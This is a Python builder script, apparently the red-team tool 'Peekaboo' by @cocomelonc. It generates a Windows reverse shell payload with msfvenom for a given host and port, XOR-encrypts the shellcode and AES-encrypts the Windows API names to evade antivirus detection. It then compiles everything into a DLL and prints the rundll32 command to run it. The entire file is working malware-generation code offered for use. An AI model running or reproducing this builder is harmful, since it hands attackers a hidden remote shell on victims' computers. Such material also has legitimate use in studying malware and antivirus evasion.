# payload encryption functions
import argparse
import subprocess
import sys
import random
import os
import hashlib
import string
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class PeekabooEncryptor():
    def __init__(self):
        #self.PAYLOAD_KEY = self.random_bytes()
        self.PAYLOAD_KEY = self.random()

    def payload_key(self):
        return self.PAYLOAD_KEY

    def func_key(self):
        return self.random_bytes()

    def aes_key(self):
        return self.random_bytes()

    def xor(self, data, key):
        key = str(key)
        l = len(key)
        output_str = ""

        for i in range(len(data)):
            current = data[i]
            current_key = key[i % len(key)]
            ordd = lambda x: x if isinstance(x, int) else ord(x)
            output_str += chr(ordd(current) ^ ord(current_key))

        return output_str

    def xor_encrypt(self, data, key):
        ciphertext = self.xor(data, key)
        ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'
        return ciphertext, key

    def pad(self, s):
        return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

    def convert(self, data):
        output_str = ""
        for i in range(len(data)):
            current = data[i]
            ordd = lambda x: x if isinstance(x, int) else ord(x)
            output_str += hex(ordd(current))
        return output_str.split("0x")

    # AES encryption
    # key is randomized (16 bytes random string),
    # and the key is then transform into the SHA256 hash and
    # then it is used as a key for encrypting plaintext
    def aes_encrypt(self, plaintext, key):
        k = hashlib.sha256(key).digest()
        iv = 16 * '\x00'
        plaintext = self.pad(plaintext)
        cipher = AES.new(k, AES.MODE_CBC, iv.encode("UTF-8"))
        ciphertext = cipher.encrypt(plaintext.encode("UTF-8"))
        ciphertext, key = self.convert(ciphertext), self.convert(key)
        ciphertext = '{' + (' 0x'.join(x + "," for x in ciphertext)).strip(",") + ' };'
        key = '{' + (' 0x'.join(x + "," for x in key)).strip(",") + ' };'
        return ciphertext, key

    def random(self):
        length = random.randint(16, 32)
        return ''.join(random.choice(string.ascii_letters) for i in range(length))

    def random_bytes(self):
        return get_random_bytes(16)

def generate_payload(host, port):
    print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
    msfv = "msfvenom -p windows/x64/shell_reverse_tcp"
    msfv += " LHOST=" + host
    msfv += " LPORT=" + port
    msfv += " -f raw"
    msfv += " -o /tmp/hack.bin"
    print (Colors.YELLOW + msfv + Colors.ENDC)
    try:
        p = subprocess.Popen(msfv.split(), stdout = subprocess.PIPE)
        p.wait()
        print (Colors.GREEN + "reverse shell payload successfully generated :)" + Colors.ENDC)
    except Exception as e:
        print (Colors.RED + "generate payload failed :(" + Colors.ENDC)
        sys.exit()

def run_peekaboo(host, port):
    banner = """
    #####  ###### #    #         ##         #####   ####   ####  
    #    # #      #   #         #  #        #    # #    # #    # 
    #    # #####  ####   ##### #    # ##### #####  #    # #    # 
    #####  #      #  #         ######       #    # #    # #    # 
    #      #      #   #        #    #       #    # #    # #    # 
    #      ###### #    #       #    #       #####   ####   ####  
    by @cocomelonc, many thanks to:
    https://institute.sektor7.net/red-team-operator-malware-development-essentials
    """
    print (Colors.BLUE + banner + Colors.ENDC)
    generate_payload(host, port)
    encryptor = PeekabooEncryptor()
    print (Colors.BLUE + "read payload..." + Colors.ENDC)
    plaintext = open("/tmp/hack.bin", "rb").read()
    # plaintext = open("./meow.bin", "rb").read()

    f_va = "VirtualAlloc"
    f_vp = "VirtualProtect"
    f_cth = "CreateThread"
    f_wfso = "WaitForSingleObject"
    f_rmm = "RtlMoveMemory"
    f_rce = "RunRCE"
    f_xor = "XOR"
    f_aes = "AESDecrypt"  
    
    print (Colors.BLUE + "encrypt..." + Colors.ENDC)
    f_rce, f_xor, f_aes = encryptor.random(), encryptor.random(), encryptor.random()
    ciphertext, p_key = encryptor.xor_encrypt(plaintext, encryptor.payload_key())
    ciphertext_va, va_key = encryptor.aes_encrypt(f_va, encryptor.aes_key())
    ciphertext_vp, vp_key = encryptor.aes_encrypt(f_vp, encryptor.aes_key())
    ciphertext_cth, ct_key = encryptor.aes_encrypt(f_cth, encryptor.aes_key())
    ciphertext_wfso, wfso_key = encryptor.aes_encrypt(f_wfso, encryptor.aes_key())
    ciphertext_rmm, rmm_key = encryptor.aes_encrypt(f_rmm, encryptor.aes_key())

    tmp = open("peekaboo.cpp", "rt")
    data = tmp.read()

    data = data.replace('unsigned char my_payload[] = { };', 'unsigned char my_payload[] = ' + ciphertext)
    data = data.replace('unsigned char s_va[] = { };', 'unsigned char s_va[] = ' + ciphertext_va)
    data = data.replace('unsigned char s_vp[] = { };', 'unsigned char s_vp[] = ' + ciphertext_vp)
    data = data.replace('unsigned char s_ct[] = { };', 'unsigned char s_ct[] = ' + ciphertext_cth)
    data = data.replace('unsigned char s_wfso[] = { };', 'unsigned char s_wfso[] = ' + ciphertext_wfso)
    data = data.replace('unsigned char s_rmm[] = { };', 'unsigned char s_rmm[] = ' + ciphertext_rmm)

    data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')

    data = data.replace('char s_va_key[] = "";', 'char s_va_key[] = ' + va_key)
    data = data.replace('char s_vp_key[] = "";', 'char s_vp_key[] = ' + vp_key)
    data = data.replace('char s_ct_key[] = "";', 'char s_ct_key[] = ' + ct_key)
    data = data.replace('char s_wfso_key[] = "";', 'char s_wfso_key[] = ' + wfso_key)
    data = data.replace('char s_rmm_key[] = "";', 'char s_rmm_key[] = ' + rmm_key)

    data = data.replace('RunRCE(', f_rce + '(')
    data = data.replace('XOR(', f_xor + '(')
    data = data.replace('AESDecrypt(', f_aes + '(')

    tmp.close()
    tmp = open("peekaboo-enc.cpp", "w+")
    tmp.write(data)
    tmp.close()

    try:
        cmd = "x86_64-w64-mingw32-g++ -shared -o peekaboo.dll peekaboo-enc.cpp -fpermissive >/dev/null 2>&1"
        os.system(cmd)
        os.remove("peekaboo-enc.cpp")
    except:
        print (Colors.RED + "error compiling template :(" + Colors.ENDC)
        sys.exit()
    else:
        print (Colors.YELLOW + cmd + Colors.ENDC)
        print (Colors.GREEN + "successfully compiled :)" + Colors.ENDC)
        print (Colors.GREEN + "rundll32 .\peekaboo.dll, " + f_rce)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-l','--lhost', required = True, help = "local IP")
    parser.add_argument('-p','--lport', required = True, help = "local port", default = '4444')
    args = vars(parser.parse_args())
    host, port = args['lhost'], args['lport']
    run_peekaboo(host, port)
